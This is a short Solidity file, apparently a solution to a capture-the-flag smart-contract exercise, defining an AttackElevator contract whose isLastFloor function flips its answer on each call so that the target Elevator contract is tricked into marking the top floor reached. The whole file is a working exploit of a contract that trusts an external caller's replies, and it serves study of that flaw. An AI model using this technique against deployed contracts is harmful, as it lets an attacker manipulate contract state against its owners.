// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./elevator.sol";

contract AttackElevator{
    bool public toggle = true;
    Elevator public target;

    constructor(address _targetAddress) public{
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint) public returns (bool){
        toggle = !toggle; // set toggle to false to pass first negation
        return toggle;
    }

    function setTop(uint _floor) public{
       target.goTo(_floor); 
    }
}
